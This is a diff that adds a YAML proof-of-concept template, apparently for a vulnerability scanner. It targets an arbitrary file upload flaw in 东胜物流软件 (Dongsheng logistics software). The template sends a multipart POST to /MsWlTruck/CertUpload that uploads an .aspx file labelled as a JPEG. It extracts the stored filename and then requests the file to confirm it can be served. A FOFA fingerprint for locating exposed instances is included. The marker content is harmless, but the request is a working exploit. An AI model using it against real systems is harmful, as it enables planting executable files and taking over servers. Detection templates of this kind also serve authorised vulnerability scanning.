@@ -1,0 +1,47 @@
+id: poc-yaml-dongshengsoft-certupload-anyfile-upload
+info:
+  name: 东胜物流软件 CertUpload 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 东胜物流软件
+  fofa: fid="Z4c2hPCi5IR/AnH5vZXNSQ=="
+variables:
+  t1: random_str(8)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /MsWlTruck/CertUpload
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTqkdY1lCvbvpmown
+  data: '------WebKitFormBoundaryTqkdY1lCvbvpmown
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.aspx"
+
+    Content-Type: image/jpeg
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundaryTqkdY1lCvbvpmown
+
+    Content-Disposition: form-data; name="TruckNo";
+
+
+    1
+
+    ------WebKitFormBoundaryTqkdY1lCvbvpmown
+
+    Content-Disposition: form-data; name="Cert_Type";
+
+
+    1
+
+    ------WebKitFormBoundaryTqkdY1lCvbvpmown--'
+  expression: status_code == 200 && contains(body,"\"success\"\x3a true") && contains(body,".aspx")
+  output:
+  - regex_match(body,"\\\\(?P<file>[0-9_]+).aspx")
+- method: GET
+  path: /Areas/TruckMng/CertImages/1/{{.file}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
